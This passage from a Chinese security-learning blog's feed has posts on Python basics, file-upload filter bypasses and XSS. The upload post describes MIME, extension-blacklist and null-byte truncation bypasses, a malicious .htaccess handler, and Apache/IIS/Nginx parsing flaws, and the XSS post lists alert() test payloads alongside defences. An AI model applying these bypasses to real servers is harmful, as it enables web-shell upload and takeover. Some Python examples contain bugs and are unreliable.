list(seq)</p><p>必会的help函数：help（）</p><p>help函数查看python模块中函数的用法</p><h3 id="元组-（）"><a href="#元组-（）" class="headerlink" title="元组 （）"></a>元组 （）</h3><p>Python的元组与列表类似，不同之处在于元组的元素不能修改。</p><p>元组中的元素值是不允许删除的，但我们可以使用del语句来删除整个元组<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">tup1 = (&apos;physics&apos;, &apos;chemistry&apos;, 1997, 2000)</span><br><span class="line">tup2 = (1, 2, 3, 4, 5, 6, 7 )</span><br><span class="line"></span><br><span class="line">print &quot;tup1[0]: &quot;, tup1[0]</span><br><span class="line">print &quot;tup2[1:5]: &quot;, tup2[1:5]</span><br></pre></td></tr></table></figure></p><h3 id="字典"><a href="#字典" class="headerlink" title="字典 { }"></a>字典 { }</h3><p>字典的每个键值 key=&gt;value 对用冒号 : 分割，每个键值对之间用逗号 , 分割，整个字典包括在花括号 {} 中</p><p>键一般是唯一的,值可以取任何数据类型</p><p>访问字典里的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">dict = &#123;&apos;Name&apos;: &apos;Zara&apos;, &apos;Age&apos;: 7, &apos;Class&apos;: &apos;First&apos;&#125;;</span><br><span class="line"></span><br><span class="line">print &quot;dict[&apos;Name&apos;]: &quot;, dict[&apos;Name&apos;];</span><br><span class="line">print &quot;dict[&apos;Age&apos;]: &quot;, dict[&apos;Age&apos;];</span><br></pre></td></tr></table></figure></p><h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><h5 id="读取键盘输入【raw-input-或者input-】"><a href="#读取键盘输入【raw-input-或者input-】" class="headerlink" title="读取键盘输入【raw_input()或者input()】"></a>读取键盘输入【raw_input()或者input()】</h5><p>打开或关闭文件，这里要用Python的内置函数open(),然后创建一个file对象</p><h5 id="python打开文件的模式："><a href="#python打开文件的模式：" class="headerlink" title="python打开文件的模式："></a>python打开文件的模式：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">r 以只读模式打开文件</span><br><span class="line">w  以只写模式打开文件，且先把文件内容清空（truncate the file first）wb 以二进制格式打开一个文件只用于写入。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。</span><br><span class="line">a   以添加模式打开文件，写文件的时候总是写到文件末尾，用seek也无用。打开的文件也是不能读的</span><br><span class="line">r+  以读写方式打开文件，文件可读可写，可写到文件的任何位置</span><br><span class="line">w+ 和r+不同的是，它会truncate the file first</span><br><span class="line">a+ 和r+不同的是，它只能写到文件末尾</span><br></pre></td></tr></table></figure><p>一个文件被打开后，就有一个file对象，可以得到有关该文件的各种信息，以下是一些使用方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file.closed        返回true如果文件已被关闭，否则返回false。</span><br><span class="line">file.mode        返回被打开文件的访问模式。</span><br><span class="line">file.name        返回文件的名称。</span><br><span class="line">file.softspace        如果用print输出后，必须跟一个空格符，则返回false。否则返回true。</span><br></pre></td></tr></table></figure></p><h5 id="创建一个txt"><a href="#创建一个txt" class="headerlink" title="创建一个txt"></a>创建一个txt</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = open（&quot;first.txt&quot;,&quot;wb&quot;）  #以二进制方式写入文本</span><br><span class="line"></span><br><span class="line">url.close()</span><br></pre></td></tr></table></figure><h5 id="在txt中写入东西"><a href="#在txt中写入东西" class="headerlink" title="在txt中写入东西"></a>在txt中写入东西</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url = open（&quot;first.txt&quot;,&quot;wb&quot;）</span><br><span class="line"></span><br><span class="line">url.write(&quot;just do it &quot;)</span><br><span class="line"></span><br><span class="line">url.close()</span><br></pre></td></tr></table></figure><h5 id="读txt里的内容"><a href="#读txt里的内容" class="headerlink" title="读txt里的内容"></a>读txt里的内容</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = open（&quot;first.txt&quot;,“r”）</span><br><span class="line"></span><br><span class="line">url.readlines( )</span><br></pre></td></tr></table></figure><p>Python 文件 readlines() 方法用于读取整个文件（所有行）到一个列表，可以由for… in … 结构进行遍历。列表的每一行变成列表的每一个元素。 </p><p>循环读取文件的内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">f = open(&quot;runoob.txt&quot;, &quot;r&quot;)             #打开文件  </span><br><span class="line">print (&quot;文件名为: &quot;, fo.name)</span><br><span class="line"></span><br><span class="line">for line in f.readlines():                     #依次读取每行 </span><br><span class="line">    line = line.strip()                              #去掉每行头尾空白 </span><br><span class="line">    print (&quot;读取的数据为: %s&quot; % (line))</span><br><span class="line"></span><br><span class="line">fo.close()  #关闭文件</span><br></pre></td></tr></table></figure></p><h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><p>这里使用python的编辑器pycharm练习判断<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">if &apos;look&apos; is  see&apos;:</span><br><span class="line">        print True</span><br><span class="line">else:</span><br><span class="line">        print False</span><br></pre></td></tr></table></figure></p><p>这个判断为True，因为当判断条件成立时（非零），则执行后面的语句</p><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><h5 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h5><p>while 判断条件：<br>    执行语句……</p><p>比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line"></span><br><span class="line">port = 1100</span><br><span class="line"></span><br><span class="line">while port &lt; 1109:</span><br><span class="line">        print &quot;The PORT is:&quot;+str(port)</span><br><span class="line">        port = port + 1</span><br></pre></td></tr></table></figure></p><h5 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h5><p>for  iterating_var  in  sequence:<br>        statements(s)</p><p>比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">sum = 0</span><br><span class="line"></span><br><span class="line">for i in [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]:</span><br><span class="line">        sum = sum + i</span><br><span class="line"></span><br><span class="line">print sum</span><br></pre></td></tr></table></figure></p><p>还可以用range函数生成一个整数数列，来表示较大的数字，比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">sum = 0</span><br><span class="line"></span><br><span class="line">for i in range(101):</span><br><span class="line">        sum = sum +i</span><br><span class="line">print sum</span><br></pre></td></tr></table></figure></p><p>如果循环没有增量，则循环会无限循环下去</p><p>打断循环，在循环过程中，  break语句可以提前退出循环  通过continue语句，跳过当前的这次循环，直接开始下一次循环。</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>文件上传攻击</title>
    <link href="http://yoursite.com/2018/08/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/08/14/文件上传漏洞/</id>
    <published>2018-08-14T14:59:05.000Z</published>
    <updated>2018-08-21T12:52:16.868Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>在网站的运营过程中，不可避免地要对网站的某些页面或者内容 进行更新，这时便需要使用到网站的文件上传的功能。如果不对被上 传的文件进行限制或者限制被绕过，该功能便有可能会被利用于上传 可执行文件、脚本到服务器上，进而进一步导致服务器沦陷。 </p><h1 id="网络渗透的本质-技术部分"><a href="#网络渗透的本质-技术部分" class="headerlink" title="网络渗透的本质(技术部分)"></a>网络渗透的本质(技术部分)</h1><p>主体就是代码注入+代码解析/执行，这种模式贯穿了几乎主流的技术性渗透攻击，像缓冲区溢出攻击，sql 注入攻击，文件上传攻击，文件包含攻击，脚本代码注入等等</p><h1 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h1><p>   导致文件上传的漏洞的原因较多，主要包括以下几类: </p><ol><li>服务器配置不当</li><li>开源编辑器上传漏洞</li><li>本地文件上传限制被绕过 </li><li>过滤不严或被绕过</li><li>文件解析漏洞导致文件执行 </li><li>文件路径截断 </li></ol><h1 id="上传检测流程"><a href="#上传检测流程" class="headerlink" title="上传检测流程"></a>上传检测流程</h1><p><img src="\images\pasted-94.png" alt="upload successful"></p><h1 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h1><h3 id="客户端检测绕过-javascript-检测"><a href="#客户端检测绕过-javascript-检测" class="headerlink" title="客户端检测绕过(javascript 检测)"></a>客户端检测绕过(javascript 检测)</h3><p>这类检测通常在上传页面里含有专门检测文件上传的 javascript 代码 最常见的就是检测扩展名是否合法 </p><p>通常post请求发送到web服务器，客户端javascript验证上传1.php弹窗说上传格式错误，只允许.jpg，.jpeg等格式的文件上传一句话1.php–&gt;1.jpg 然后burp抓包1.jpg–&gt;1.php，这样就绕过了js检测</p><h3 id="服务器端检测MIME类型的绕过"><a href="#服务器端检测MIME类型的绕过" class="headerlink" title="服务器端检测MIME类型的绕过"></a>服务器端检测MIME类型的绕过</h3><pre><code>服务端MIME类型检测（检测Content-Type内容），burp抓包，修改Content-TypeContent-Type:text/plain --&gt;phpContent-Type:image/jpeg --&gt;image上传1.jpg---&gt;修改image/jpeg为text/plain，成功绕过。</code></pre><h4 id="常见的MIME类型："><a href="#常见的MIME类型：" class="headerlink" title="常见的MIME类型："></a>常见的MIME类型：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​    超文本标记语言文本 .html text/html 　　</span><br><span class="line"></span><br><span class="line">​    xml文档 .xml text/xml</span><br><span class="line"></span><br><span class="line">​    普通文本 .txt text/plain 　　</span><br><span class="line"></span><br><span class="line">​    RTF文本 .rtf application/rtf 　　</span><br><span class="line"></span><br><span class="line">​    PDF文档 .pdf application/pdf 　　</span><br><span class="line"></span><br><span class="line">​    Microsoft Word文件 .word application/msword 　　</span><br><span class="line"></span><br><span class="line">​    PNG图像 .png image/png 　　</span><br><span class="line"></span><br><span class="line">​    GIF图形 .gif image/gif 　　</span><br><span class="line"></span><br><span class="line">​    JPEG图形 .jpeg,.jpg image/jpeg 　　</span><br><span class="line"></span><br><span class="line">​    au声音文件 .au audio/basic 　　</span><br><span class="line"></span><br><span class="line">​    MIDI音乐文件 mid,.midi audio/midi,audio/x-midi 　　</span><br><span class="line"></span><br><span class="line">​    RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio 　　</span><br><span class="line"></span><br><span class="line">​    MPEG文件 .mpg,.mpeg video/mpeg 　　</span><br><span class="line"></span><br><span class="line">​    AVI文件 .avi video/x-msvideo 　　</span><br><span class="line"></span><br><span class="line">​    GZIP文件 .gz application/x-gzip 　　</span><br><span class="line"></span><br><span class="line">​    TAR文件 .tar application/x-tar 　　</span><br><span class="line"></span><br><span class="line">​    任意的二进制数据 application/octet-stream</span><br></pre></td></tr></table></figure><h3 id="服务器目录路径检测绕过"><a href="#服务器目录路径检测绕过" class="headerlink" title="服务器目录路径检测绕过"></a>服务器目录路径检测绕过</h3><p>目录路径检测，一般就检测路径是否合法，但稍微特殊一点的都没有防御。 </p><p>上传1.jpg,burp进行抓包，Content-Disposition:from-data;name=”path”后面一行upload是我们保存的地址。</p><p>现在我们将upload改为upload/1.php(空格) ，接着我们来到 Proxy-&gt;intercept-&gt;Hex找到1.php(空格)这个被修改   过的代码，找到同一行的数字20，改为00 ，成功绕过</p><h3 id="服务器端黑名单检测绕过"><a href="#服务器端黑名单检测绕过" class="headerlink" title="服务器端黑名单检测绕过"></a>服务器端黑名单检测绕过</h3><p>黑名单的安全性比白名单的安全性低很多，攻击手法自然也比白名单多 一般有个专门的 blacklist 文件</p><h5 id="1-文件名大小写绕过pHp-PhP"><a href="#1-文件名大小写绕过pHp-PhP" class="headerlink" title="1.文件名大小写绕过pHp,PhP"></a>1.文件名大小写绕过pHp,PhP</h5><p>混搭绕过<code>php1,php2,php3,php4,php5，phtml,pht</code> </p><h5 id="2-名单列表绕过"><a href="#2-名单列表绕过" class="headerlink" title="2.名单列表绕过"></a>2.名单列表绕过</h5><p>用黑名单里没有的名单进行攻击， <code>cer,ashx,asa,cer,cdx,htr</code>,绕过(黑名单可能会漏掉的) </p><h5 id="3-特殊文件名绕过"><a href="#3-特殊文件名绕过" class="headerlink" title="3.特殊文件名绕过"></a>3.特殊文件名绕过</h5><p>比如发送的 http 包里把文件名改成 <code>test.asp. 或 test.asp_(下划线为空格)</code>，这种命名方式 在 windows 系统里是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会 被 windows 系统自动去掉后面的点和空格，但要注意 Unix/Linux 系统没有这个特性。</p><h5 id="4-0x00-截断绕过"><a href="#4-0x00-截断绕过" class="headerlink" title="4.0x00 截断绕过"></a>4.0x00 截断绕过</h5><p>在扩展名检测这一块目前只遇到过 asp 的程序有这种漏洞，给个简单的伪代码<code>name = getname(http request) //</code>假如这时候获取到的文件名是 test.asp .jpg(asp 后面为 0x00)  <code>type = gettype(name) /</code>/而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 <code>jpg  if (type == jpg)SaveFileToPath(UploadPath.name, name)</code> //但在这里却是以 0x00 作为文件名截断                 //最后以 test.asp 存入路径里</p><h5 id="5-htaccess-文件攻击"><a href="#5-htaccess-文件攻击" class="headerlink" title="5..htaccess 文件攻击"></a>5..htaccess 文件攻击</h5><p>配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测</p><p>自定义.htaccess上传，下面是内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">​        &lt;FileMatch &quot;aaa&quot;&gt;</span><br><span class="line"></span><br><span class="line">​        SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">​        &lt;/FileMatch&gt;</span><br></pre></td></tr></table></figure><pre><code>同目录下，上传一个aaa文件，没有扩展名，内容是一句话，这个时候就成功绕过。</code></pre><h5 id="6-解析调用-漏洞绕过"><a href="#6-解析调用-漏洞绕过" class="headerlink" title="6.解析调用/漏洞绕过"></a>6.解析调用/漏洞绕过</h5><p>这类漏洞直接配合上传一个代码注入过的非黑名单文件即可，再利用解析调用/漏洞</p><h3 id="服务器端白名单检测绕过"><a href="#服务器端白名单检测绕过" class="headerlink" title="服务器端白名单检测绕过"></a>服务器端白名单检测绕过</h3><p>白名单相对来说比黑名单安全一些，但也不见得就绝对安全了</p><h5 id="1-0x00-截断绕过"><a href="#1-0x00-截断绕过" class="headerlink" title="1.0x00 截断绕过"></a>1.0x00 截断绕过</h5><p>用像 test.asp%00.jpg 的方式进行截断，属于白名单文件，再利用服务端代码的检测逻辑 漏洞进行攻击，目前我只遇到过 asp 的程序有这种漏洞</p><h5 id="2-解析调用-漏洞绕过"><a href="#2-解析调用-漏洞绕过" class="headerlink" title="2.解析调用/漏洞绕过"></a>2.解析调用/漏洞绕过</h5><p>这类漏洞直接配合上传一个代码注入过的白名单文件即可，再利用解析调用/漏洞</p><h5 id="htaccess-文件攻击"><a href="#htaccess-文件攻击" class="headerlink" title=".htaccess 文件攻击"></a>.htaccess 文件攻击</h5><p>无论是黑名单还是白名单</p><p>再直接点就是直接攻击.htaccess 文件</p><p>在 PHP manual 中提到了下面一段话</p><p>move_uploaded_file section, there is a warning which states  ‘If the destination file already exists, it will be overwritten.’  如果 PHP 安全没配置好</p><p>就可以通过 move_uploaded_file 函数把自己写的.htaccess 文件覆盖掉服务器上的 这样就能任意定义解析名单了</p><h3 id="网络渗透本质：代码注入-代码解析-执行"><a href="#网络渗透本质：代码注入-代码解析-执行" class="headerlink" title="网络渗透本质：代码注入+代码解析/执行"></a>网络渗透本质：代码注入+代码解析/执行</h3><h4 id="主要是两类情况"><a href="#主要是两类情况" class="headerlink" title="主要是两类情况"></a>主要是两类情况</h4><h5 id="1-直接解析-执行攻击"><a href="#1-直接解析-执行攻击" class="headerlink" title="1.直接解析/执行攻击"></a>1.直接解析/执行攻击</h5><p>像缓冲区溢出和 sql 注入攻击，脚本代码注入就是很明显的属于这里攻击 直接将代码注入到一个解析/执行环境里，直接就能让代码得到执行所以危害性也来得最大，效果最明显</p><p>shellcode 注入程序后，直接劫持 EIP，进行该系统环境权限做任何操作</p><p>sql 命令注入数据库后，直接就能执行该数据库账号权限下的任何操作</p><h5 id="2-配合解析-执行攻击"><a href="#2-配合解析-执行攻击" class="headerlink" title="2.配合解析/执行攻击"></a>2.配合解析/执行攻击</h5><p>算是一种组合攻击，在这类情况下</p><p>往往不像第一种情况能拥有直接的解析/执行环境 比较明显的就是我们的上传攻击</p><p>我们需要先上传数据(注入代码)到服务端上去</p><p>然后想办法去调用解析/执行环境(比如 Web 应用程序解析漏洞)  来解析/执行已经注入到了服务端的代码</p><h4 id="三种解析方式"><a href="#三种解析方式" class="headerlink" title="三种解析方式"></a>三种解析方式</h4><h5 id="直接解析"><a href="#直接解析" class="headerlink" title="-直接解析"></a>-直接解析</h5><p>能以 asp,php 之类的扩展名存储在服务器上</p><h5 id="本地文件包含解析"><a href="#本地文件包含解析" class="headerlink" title="-本地文件包含解析"></a>-本地文件包含解析</h5><p>主要是 php 的本地文件包含 (远程文件包含不属于上传攻击绕过范畴)</p><h5 id="htaccess-解析"><a href="#htaccess-解析" class="headerlink" title="-.htaccess 解析"></a>-.htaccess 解析</h5><p>.htaccess 文件 用户自己定义如何去调用解析器解析文件就可以了</p><h3 id="Web应用程序解析漏洞"><a href="#Web应用程序解析漏洞" class="headerlink" title="Web应用程序解析漏洞"></a>Web应用程序解析漏洞</h3><h4 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h4><p>111.php.ddd</p><p>解析 - test.php.任意不属于黑名单且也不属于 Apache 解析白名单的名称</p><p>描述 - 一个文件名为 x1.x2.x3 的文件，Apache 会从 x3 的位置往 x1 的位置开始尝试解析 如果 x3 不属于 Apache 能解析的扩展名，那么 Apache 会尝试去解析 x2 的位置，  从后往前解析，直到遇到一个能解析的扩展名为止</p><h4 id="IIS-解析漏洞"><a href="#IIS-解析漏洞" class="headerlink" title="IIS 解析漏洞"></a>IIS 解析漏洞</h4><p> 解析 - test.asp/任意文件名 | test.asp;任意文件名 | 任意文件名/任意文件名.php</p><p> IIS6.0 在解析 asp 格式的时候有两个解析漏洞，一个是如果目录名包含”.asp”字符串，  那么这个目录下所有的文件都会按照 asp 去解析，另一个是只要文件名中含有”.asp;”  会优先按 asp 来解析</p><p> IIS7.0/7.5 是对 php 解析时有一个类似于 Nginx 的解析漏洞，对任意文件名只要在 URL后面追加上字符串”/任意文件名.php”就会按照 php 的方式去解析</p><h4 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h4><p>解析 - 任意文件名/任意文件名.php | 任意文件名%00.php</p><p>描述 - 目前 Nginx 主要有这两种漏洞，一个是对任意文件名，在后面添加/任意文件名.php  的解析漏洞，比如原本文件名是 test.jpg，可以添加为 test.jpg/x.php 进行解析攻击。 还有一种是对低版本的 Nginx 可以在任意文件名后面添加%00.php 进行解析攻击。</p><h3 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h3><p><img src="\images\pasted-93.png" alt="upload successful"></p><h3 id="应用层上传漏洞攻击思路"><a href="#应用层上传漏洞攻击思路" class="headerlink" title="应用层上传漏洞攻击思路"></a>应用层上传漏洞攻击思路</h3><p><img src="\images\pasted-92.png" alt="upload successful"></p><h3 id="一个不常见的绕过方式"><a href="#一个不常见的绕过方式" class="headerlink" title="一个不常见的绕过方式"></a>一个不常见的绕过方式</h3><p>文件上传绕过   上传一个php文件，用burp抓包   头部的Content-Type改成Multipart/form-data大小写绕过   请求内容里的Content-Type改成image，文件名改成php5就绕过了</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>XSS跨站脚本漏洞</title>
    <link href="http://yoursite.com/2018/08/14/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/08/14/XSS跨站脚本漏洞/</id>
    <published>2018-08-14T09:19:05.000Z</published>
    <updated>2018-08-19T11:48:36.982Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><h1 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h1><p>XSS又叫CSS  (Cross Site Script) ，跨站脚本攻击。它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。</p><h1 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h1><p>第一种：反射型XSS 简单的把用户数据反射给浏览器，需要用户点击</p><p>第二种：存储型XSS 把用户输入的数据存储在服务器中</p><p>第三种：DOM Based XSS 通过修改DOM节点的反射型xss</p><h1 id="检测漏洞存在"><a href="#检测漏洞存在" class="headerlink" title="检测漏洞存在"></a>检测漏洞存在</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script&gt;alert(&quot;1&quot;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;img  src= javascript:alert(&quot;1&quot;)&gt;&lt;/img&gt;</span><br><span class="line"></span><br><span class="line">&lt;img   dynsrc= javascript:alert(&quot;1&quot;)&gt;&lt;/img&gt;</span><br><span class="line"></span><br><span class="line">&lt;div  style= &quot;background-image:url(  javascript:alert(&apos;1&apos;) )&quot; &gt;</span><br><span class="line"></span><br><span class="line">&lt;font style=&quot;TEST:expression(alert(&apos;1&apos;))&quot;&gt;</span><br></pre></td></tr></table></figure><h1 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h1><p>存储式XSS构成：</p><p><img src="\images\pasted-86.png" alt="upload successful"></p><p>反射式XSS构成：</p><p><img src="\images\pasted-87.png" alt="upload successful"></p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>1.对html中不可信字符串进行html转义</p><p>2.对html属性中不可信的字符串进行HTML转义</p><p>3.对javascript字符串中不可信的html先进行html转义，再JavaScript转义</p><p>4.使用白名单，使用UTF-8为默认的字符的字符编码</p><p>5.设置HttpOnly和htmlspecialchars</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Web安全基础</title>
    <link href="http://yoursite.com/2018/08/14/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    <id>http://yoursite.com/2018/08/14/Web安全基础/</id>
    <published>2018-08-14T07:06:05.000Z</published>
    <updated>2018-08-14T12:58:55.639Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-78.png" alt="upload successful"></p><h1 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h1><p><img src="\images\pasted-79.png" alt="upload successful"></p><h1 id="注入漏洞"><a href="#注入漏洞" class="headerlink" title="注入漏洞"></a>注入漏洞</h1><p><img src="\images\pasted-80.png" alt="upload successful"></p><h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><p><img src="\images\pasted-81.png" alt="upload successful"></p><p>### </p><h1 id="请求伪造漏洞"><a href="#请求伪造漏洞" class="headerlink" title="请求伪造漏洞"></a>请求伪造漏洞</h1><p><img src="\images\pasted-82.png" alt="upload successful"></p><h1 id="文件处理漏洞"><a href="#文件处理漏洞" class="headerlink" title="文件处理漏洞"></a>文件处理漏洞</h1><p><img src="\images\pasted-83.png" alt="upload successful"></p><h1 id="访问控制漏洞"><a href="#访问控制漏洞" class="headerlink" title="访问控制漏洞"></a>访问控制漏洞</h1><p><img src="\images\pasted-84.png" alt="upload successful"></p><h1 id="会话管理漏洞"><a href="#会话管理漏洞" class="headerlink" title="会话管理漏洞"></a>会话管理漏洞</h1><p><img src="\images\pasted-85.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>AWVS使用指北</title>
    <link href="http://yoursite.com/2018/08/14/AWVS%E6%8C%87%E5%8D%97/"/>
    <id>http://yoursite.com/2018/08/14/AWVS指南/</id>
    <published>2018-08-14T05:54:05.000Z</published>
    <updated>2018-08-14T06:58:01.327Z</updated>
    
